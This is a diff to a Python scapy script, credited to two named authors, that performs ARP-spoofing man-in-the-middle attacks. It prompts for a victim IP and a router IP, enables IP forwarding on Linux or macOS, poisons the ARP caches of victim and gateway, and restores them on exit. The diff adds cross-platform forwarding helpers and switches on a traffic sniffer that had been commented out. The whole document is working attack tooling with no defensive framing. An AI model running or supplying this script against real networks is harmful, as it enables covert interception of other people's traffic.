@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 # Authors: Matt Matero & Will Cusick
 # Python Version: 3.5.2
 from scapy.all import *
@@ -9,14 +10,34 @@ try:
   interface = input("[*] Enter Desired Interface: ")
   victimIP = input("[*] Enter Victim IP: ")
   gateIP = input("[*] Enter Router IP: ")
+  print()
 except KeyboardInterrupt:
   print("\n[*] User Requested Shutdown")
   print("[*] Exiting...")
   sys.exit(1)
- 
-print("\n[*] Enabling IP Forwarding...\n")
-os.system("sudo sysctl net.ipv4.ip_forward=1")
- 
+
+def enable_ip_forwarding():
+  print("[*] Enabling IP Forwarding...")
+  if sys.platform.startswith('linux'):
+    os.system("sudo sysctl net.ipv4.ip_forward=1")
+  elif sys.platform.startswith('darwin'):
+    os.system("sudo sysctl net.inet.ip.forwarding=1")
+  else:
+    print("Error: Unsupported platform!")
+    raise NotImplementedError("unsupported platform")
+
+def disable_ip_forwarding():
+  print("[*] Disabling IP Forwarding...")
+  if sys.platform.startswith('linux'):
+    os.system("sudo sysctl net.ipv4.ip_forward=0")
+  elif sys.platform.startswith('darwin'):
+    os.system("sudo sysctl net.inet.ip.forwarding=0")
+  else:
+    print("Error: Unsupported platform!")
+    raise NotImplementedError("unsupported platform")
+
+enable_ip_forwarding()
+
 def get_mac(IP):
   print('Getting MAC addr for: ' + str(IP))
   conf.verb = 0
@@ -35,8 +56,7 @@ def reARP():
   gateMAC = get_mac(gateIP)
   send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
   send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
-  print("[*] Disabling IP Forwarding...")
-  os.system("sudo sysctl net.ipv4.ip_forward=0")
+  disable_ip_forwarding()
   print("[*] Shutting Down...")
   sys.exit(1)
  
@@ -56,7 +76,7 @@ def mitm():
     print(victimMAC)
   except Exception as e:
     print(e)
-    os.system("sudo sysctl net.ipv4.ip_forward=0")            
+    disable_ip_forwarding()
     print("[!] Couldn't Find Victim MAC Address")
     print("[!] Exiting...")
     sys.exit(1)
@@ -65,7 +85,7 @@ def mitm():
     gateMAC = get_mac(gateIP)
   except Exception as e:
     print(e)
-    os.system("sudo sysctl net.ipv4.ip_forward=0")            
+    disable_ip_forwarding()
     print("[!] Couldn't Find Gateway MAC Address")
     print("[!] Exiting...")
     sys.exit(1)
@@ -79,7 +99,7 @@ def mitm():
       # print('******')
       trick(gateMAC, victimMAC)
       time.sleep(1.5)
-      #sniffer()
+      sniffer()
     except KeyboardInterrupt:
       reARP()
       break
